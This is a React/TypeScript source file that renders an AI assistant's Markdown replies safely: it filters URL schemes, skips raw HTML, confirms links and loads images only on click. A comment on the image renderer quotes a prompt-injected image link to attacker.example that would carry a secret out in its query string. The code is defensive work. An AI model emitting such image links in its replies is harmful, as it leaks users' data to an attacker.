import { type MouseEvent, type ReactNode, use, useState } from 'react'
import { type Components, type ExtraProps, Streamdown, type UrlTransform, useIsCodeFenceIncomplete } from 'streamdown'
import remarkGfm from 'remark-gfm'
import { ImageIcon } from 'lucide-react'
import { blockKind } from '../../lib/fences.ts'
import { RichBlock } from './blocks.tsx'
import { LinkConfirm } from './link-confirm.tsx'

/**
 * Streamdown's own renderers, each replaced by its plain element: shadcn/typeset sets Goblin's Markdown, not
 * Streamdown's classes, buttons and wrappers. `test/markdown-render.test.ts` checks that this names every one of them.
 */
export const PLAIN = {
  a: 'a',
  blockquote: 'blockquote',
  code: 'code',
  h1: 'h1',
  h2: 'h2',
  h3: 'h3',
  h4: 'h4',
  h5: 'h5',
  h6: 'h6',
  hr: 'hr',
  img: 'img',
  li: 'li',
  ol: 'ol',
  p: 'p',
  pre: 'pre',
  section: 'section',
  strong: 'strong',
  sub: 'sub',
  sup: 'sup',
  table: 'table',
  tbody: 'tbody',
  td: 'td',
  th: 'th',
  thead: 'thead',
  tr: 'tr',
  ul: 'ul',
} as const satisfies Components

/** Wide tables scroll sideways instead of widening the conversation. */
export const Table = ({ children }: { readonly children?: ReactNode } & ExtraProps) => (
  <div className="typeset-scroll">
    <table>{children}</table>
  </div>
)

type PreProps = { readonly children?: ReactNode } & ExtraProps
/**
 * A code block, or the figure it describes (```mermaid, ```chart, ```map). While a reply streams, the block whose
 * fence is still open stays code until it is whole: Streamdown parses each block on its own and says which one that is.
 * The figure's fallback is marked `data-figure`, so it is visible (and tested) which code becomes a figure.
 */
function Pre({ node, children }: PreProps) {
  const incomplete = useIsCodeFenceIncomplete()
  const code = node?.children[0]
  if (code?.type !== 'element' || code.tagName !== 'code') return <pre>{children}</pre>
  const kind = blockKind(code.properties.className)
  if (kind === undefined || incomplete) return <pre>{children}</pre>
  const source = code.children.map((child) => (child.type === 'text' ? child.value : '')).join('')
  return <RichBlock kind={kind} source={source} code={<pre data-figure={kind}>{children}</pre>} />
}

const SAFE_PROTOCOL = /^(?:https?|ircs?|mailto|xmpp)$/iu
/** Where a URL's scheme would end, if what comes before its first `/`, `?` or `#` has a colon. */
const schemeEnd = (url: string) => {
  const colon = url.indexOf(':')
  const path = Math.min(...['/', '?', '#'].map((mark) => url.indexOf(mark)).filter((at) => at !== -1))
  return colon !== -1 && colon < path ? colon : -1
}
/**
 * The URLs react-markdown let through: relative ones, and web, mail and chat addresses; every other scheme
 * (`javascript:`, `data:`) is dropped. Streamdown's own default passes everything and leaves this to rehype-harden.
 */
export const safeUrl: UrlTransform = (url) => {
  const end = schemeEnd(url)
  return end === -1 || SAFE_PROTOCOL.test(url.slice(0, end)) ? url : undefined
}

/**
 * A link in a reply: a real link (its address shows on hover and copies), which in the shell asks before it opens
 * (`LinkConfirm`), on a click or a middle click alike. It opens in a new tab without a referrer.
 */
function ChatLink({
  href,
  children,
}: { readonly href?: string | undefined; readonly children?: ReactNode } & ExtraProps) {
  const ask = use(LinkConfirm)
  const confirm =
    ask === undefined || href === undefined
      ? undefined
      : (event: MouseEvent) => {
          if (event.button > 1) return
          event.preventDefault()
          ask(href)
        }
  return (
    <a href={href} target="_blank" rel="noreferrer noopener" onClick={confirm} onAuxClick={confirm}>
      {children}
    </a>
  )
}

/**
 * An image in a reply: named, with where it is from, and fetched only when the owner asks. A reply cannot make the
 * browser call an address by itself, so a prompt-injected `![](https://attacker.example/?d=secret)` carries nothing
 * out. Once asked, it loads without a referrer; anything but a web address stays a name.
 */
function ChatImage({
  src,
  alt,
}: { readonly src?: string | undefined; readonly alt?: string | undefined } & ExtraProps) {
  const [shown, setShown] = useState(false)
  const url = src === undefined ? null : URL.parse(src)
  const name = alt === undefined || alt === '' ? 'Image' : alt
  if (url === null || (url.protocol !== 'https:' && url.protocol !== 'http:'))
    return (
      <span className="inline-flex items-center gap-1 text-muted-foreground">
        <ImageIcon aria-hidden className="size-3.5" />
        {name}
      </span>
    )
  if (shown) return <img src={url.href} alt={alt ?? ''} referrerPolicy="no-referrer" loading="lazy" decoding="async" />
  return (
    <button
      type="button"
      className="inline-flex items-center gap-1.5 rounded-md border px-2 py-0.5 text-sm text-muted-foreground hover:bg-muted"
      title={url.href}
      aria-label={`Load image ${name} from ${url.host}`}
      onClick={() => setShown(true)}
    >
      <ImageIcon aria-hidden className="size-3.5" />
      {name}
      <span className="text-xs">{url.host}</span>
    </button>
  )
}

const CHAT: Components = { ...PLAIN, a: ChatLink, img: ChatImage, table: Table, pre: Pre }
export const REMARK = [remarkGfm]
/** No rehype plugins: Streamdown's defaults would render raw HTML (`rehype-raw`). */
export const NO_REHYPE: [] = []

/**
 * Assistant Markdown, set by shadcn/typeset; raw HTML is never rendered. Always in Streamdown's streaming mode, so a
 * reply's blocks stay mounted when it settles (a table scrolled sideways keeps its place): `live` only says whether
 * the last block may still be unfinished, and lets Streamdown close what the model has not closed yet (`**bold`).
 * Streamdown parses the text into blocks and renders each on its own, so a streamed batch renders the block being
 * written again, not the whole reply.
 */
export function ChatMarkdown({ text, live }: { readonly text: string; readonly live: boolean }) {
  return (
    <div className="typeset typeset-chat">
      <Streamdown
        mode="streaming"
        isAnimating={live}
        parseIncompleteMarkdown={live}
        remarkPlugins={REMARK}
        rehypePlugins={NO_REHYPE}
        urlTransform={safeUrl}
        components={CHAT}
        controls={false}
        lineNumbers={false}
      >
        {text}
      </Streamdown>
    </div>
  )
}
